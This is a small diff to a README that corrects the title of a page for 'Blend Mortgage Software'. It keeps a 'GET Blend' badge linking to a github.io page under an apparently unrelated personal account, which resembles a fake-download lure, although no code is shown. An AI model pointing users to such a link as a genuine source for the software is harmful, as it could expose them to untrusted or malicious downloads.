@@ -1,4 +1,4 @@
-# Blend Wortgage Software - Mortgage Software and Digital Lending Platform
+# Blend Mortgage Software - Mortgage Software and Digital Lending Platform
 
 [![GET Blend](https://img.shields.io/badge/GET%20%E2%80%94%20Blend-0078D6?style=for-the-badge&logoColor=white)](https://juanhowardbrkq.github.io/.github/blend-mortgage-software)
 
